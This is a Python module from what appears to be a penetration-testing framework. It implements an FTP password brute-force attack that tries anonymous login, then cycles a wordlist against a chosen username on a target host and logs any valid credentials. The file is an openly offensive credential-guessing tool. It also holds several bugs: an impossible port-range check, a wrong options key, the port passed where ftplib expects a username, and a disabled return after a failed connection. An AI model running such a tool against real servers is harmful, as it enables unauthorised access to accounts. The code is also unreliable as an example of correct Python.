#!/usr/bin/python3

import ipaddress
from helpers.colours import plus, minus, warning, info
from ftplib import FTP
import os
from modules.module import Module


class FTPBruteforce(Module):

    def __init__(self, *args, **kwargs):

        super().__init__(*args, **kwargs)
        self.log_file = args[0]

        self.info = {
            'Name': 'FTPBruteforce',
            'Author': 'Alessandro Cara',
            'Description': 'FTP bruteforce'
        }

        self.options = {
            'Ip': {
                'Description': 'Target IP',
                'Required': True,
                'Value': '127.0.0.1'
                },
            'Port': {
                'Description': 'Port where FTP is running',
                'Required': True,
                'Value': 21
                },
            'PasswordWordlist': {
                'Description': 'Path to the password wordlist',
                'Required': True,
                'Value': ''
                },
            'Username': {
                'Description': 'Username to use in bruteforce attack',
                'Required': True,
                'Value': ''
                }
        }

    def validate_options(self):
        for key, value in self.options.items():
            if value['Required'] and value['Value'] == "":
                minus("Please fill in all the required options")
                return False
        
        try:
            ipaddress.ip_address(self.options['Ip']['Value'])
        except Exception:
            minus("The ip address is not a valid one")
            return False

        if int(self.options['Port']['Value']) < 0 and int(self.options['Port']['Value']) > 65535:
            minus("The port has to be between 0 and 65535")
            return False

        if not os.path.exists(self.options['PasswordWordlist']['Value']):
            minus("The path to the wordlist does not exist")
            return False

        return True

    def parse_wordlist(self):
        with open(self.options['PasswordWordlist']['Value'], "r") as wd:
            return wd.read().splitlines()

    def run(self):
        if not self.validate_options():
            return False

        password_wordlist = self.parse_wordlist()
        self.anonymous_login()

        try:
            client = FTP(self.options['Ip']['Value'], self.options['Port']['Value'])
        except Exception:
            minus("Could not connect to the remote server")
            self.log_to_file("Could not connect to the remote server")
            #return
        
        for word in password_wordlist:
            try:
                client.login(self.options['Username']['Value'], word)
                plus("Credentials found %s:%s" %( self.options['Username']['Value'], word))
                self.log_to_file("Credentials found %s:%s" % (self.options['Username']['Value'], word))
                return
            except Exception:
                pass

        minus("Could not find any valid credentials")
        self.log_to_file("Could not find any valid credentials")

    def anonymous_login(self):
        try:
            client = FTP(self.options['Ip']['Value'], self.options['Ip']['Port'])
            client.login()
            plus("Anonymous login was successful")
            self.log_to_file("Anonymous login was successful")
        except Exception:
            info("Anonymous login was not successful")
            self.log_to_file("Anonymous login was not successful")
